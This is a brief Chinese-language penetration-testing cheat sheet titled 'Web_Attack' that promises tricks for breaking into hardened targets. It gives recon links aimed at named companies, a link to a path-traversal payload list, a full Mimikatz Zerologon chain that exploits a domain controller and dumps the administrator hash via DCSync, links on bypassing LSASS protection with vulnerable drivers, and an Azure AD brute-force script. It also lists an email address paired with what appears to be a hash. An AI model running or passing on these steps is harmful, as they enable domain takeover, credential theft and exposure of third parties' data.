# Web_Attack

记录一些渗透中的小技巧，帮助各位攻破各种"不可能"


验证Mail是否存在

http://mailtester.com/testmail.php


搜索Google群组,查看是否有群组，可以查看到邮箱 用户 或者 第三方域名

https://groups.google.com/a/binance.com/forum/


发现WEB-INF/web.xml，扩大攻击面

https://gist.githubusercontent.com/harisec/519dc6b45c6b594908c37d9ac19edbc3/raw/af521a3c730d4a77660e91ed41f51725cb0bbde3/exploit_path_traversals_in_Java_webapps.txt


Zerologon  突破 445

lsadump::zerologon /target:WIN-4MRAELMUJKS /account:WIN-4MRAELMUJKS$

lsadump::zerologon /target:WIN-4MRAELMUJKS /account:WIN-4MRAELMUJKS$ /exploit

lsadump::dcsync /domain:red.com /dc:WIN-4MRAELMUJKS /user:administrator /authuser:WIN-4MRAELMUJKS$ /authdomain:red /authpassword:"" /authntlm

lsadump::postzerologon /target:red.com /account:WIN-4MRAELMUJKS$

利用BYOvD漏洞加载mimidiv 来绕过Lsass保护
https://medium.com/@gorkemkaradeniz/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5
https://github.com/alxbrn/gdrv-loader  POC

"sec@smartservice.com.cn"
"bfaec2da79d0955518c6beb581e09f47"


https://arstechnica.com/information-technology/2021/09/new-azure-active-directory-password-brute-forcing-flaw-has-no-fix/

https://github.com/nyxgeek/AzureAD_Autologon_Brute/blob/main/azuread_autologon_brute.py







